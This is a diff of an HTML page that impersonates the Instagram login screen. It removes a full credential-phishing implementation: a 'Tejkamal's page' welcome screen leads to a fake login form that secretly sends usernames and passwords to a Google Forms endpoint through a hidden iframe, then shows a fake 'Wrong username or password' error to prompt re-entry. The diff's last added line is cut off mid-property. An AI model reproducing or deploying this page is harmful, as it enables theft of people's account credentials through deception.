@@ -4,7 +4,6 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Instagram</title>
-  <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&display=swap" rel="stylesheet">
   <style>
     * {
       box-sizing: border-box;
@@ -49,13 +48,9 @@
       cursor: pointer;
     }
 
-    /* Fancy Instagram Title */
+    /* Instagram Logo as Title */
     .title {
-      font-family: 'Great Vibes', cursive;
-      font-size: 38px;
-      color: #262626;
       margin: 20px 0 30px;
-      letter-spacing: 1px;
     }
 
     .login-container {
@@ -80,146 +75,4 @@
     .login-box input[type="password"] {
       width: 100%;
       padding: 12px 10px;
-      border: 1px solid #dbdbdb;
-      border-radius: 4px;
-      background-color: #fafafa;
-      font-size: 14px;
-      box-sizing: border-box;
-      outline: none;
-    }
-
-    .login-box input[type="text"]:focus,
-    .login-box input[type="password"]:focus {
-      border-color: #0095f6;
-    }
-
-    .login-box input[type="submit"] {
-      width: 100%;
-      padding: 8px;
-      margin: 20px 0;
-      background-color: #0095f6;
-      color: #fff;
-      border: none;
-      border-radius: 4px;
-      font-size: 14px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: background-color 0.2s;
-    }
-
-    .login-box input[type="submit"]:hover {
-      background-color: #007bb5;
-    }
-
-    .error-message {
-      color: #ed4956;
-      font-size: 12px;
-      margin-top: 10px;
-      display: none;
-    }
-
-    .divider {
-      display: flex;
-      align-items: center;
-      margin: 20px 0;
-      color: #8e8e8e;
-      font-size: 12px;
-    }
-
-    .divider hr {
-      flex-grow: 1;
-      border: none;
-      border-top: 1px solid #dbdbdb;
-    }
-
-    .divider span {
-      margin: 0 15px;
-    }
-
-    .footer {
-      margin-top: 25px;
-      font-size: 12px;
-      color: #8e8e8e;
-    }
-
-    .footer a {
-      color: #00376b;
-      text-decoration: none;
-      font-weight: 600;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-  </style>
-</head>
-<body>
-
-  <!-- Welcome Page -->
-  <div id="welcome-screen">
-    <h2>Hi, welcome to Tejkamal's page 😊</h2>
-    <button onclick="startInstagramLogin()">Sign up with Instagram</button>
-  </div>
-
-  <!-- Login Page -->
-  <div id="login-section" class="login-container" style="display: none;">
-    <div class="title">Instagram</div>
-    <div class="login-box">
-      <form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSeeQOC82j3KlAIyLeF57niS63fow9ij7N6VjaZVy-ayxhv4Cg/formResponse"
-            method="POST"
-            target="hidden_iframe"
-            onsubmit="submitted = true;">
-        <div class="input-group">
-          <input type="text" name="entry.363416333" placeholder="Phone number, username, or email" required />
-        </div>
-        <div class="input-group">
-          <input type="password" name="entry.20945221" placeholder="Password" required />
-        </div>
-        <input type="submit" value="Log In" />
-      </form>
-
-      <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" onload="if(submitted){ window.location.href='?error=true'; }"></iframe>
-
-      <div id="errorMessage" class="error-message">Wrong username or password</div>
-
-      <div class="divider">
-        <hr /><span>OR</span><hr />
-      </div>
-
-      <div class="footer">
-        Don't have an account? <a href="#">Sign up</a>
-      </div>
-    </div>
-  </div>
-
-  <script>
-    let submitted = false;
-
-    function showLoginPage() {
-      document.getElementById('welcome-screen').style.display = 'none';
-      document.getElementById('login-section').style.display = 'block';
-    }
-
-    // Show login page directly on error or revisit
-    window.onload = function () {
-      const params = new URLSearchParams(window.location.search);
-      const alreadyVisited = sessionStorage.getItem('visited');
-
-      if (params.get("error") === "true" || alreadyVisited) {
-        showLoginPage();
-      }
-
-      if (params.get("error") === "true") {
-        document.getElementById("errorMessage").style.display = "block";
-      }
-    };
-
-    function startInstagramLogin() {
-      sessionStorage.setItem('visited', 'true');
-      showLoginPage();
-    }
-  </script>
-
-</body>
-</html>
+      border: 1px solid #db
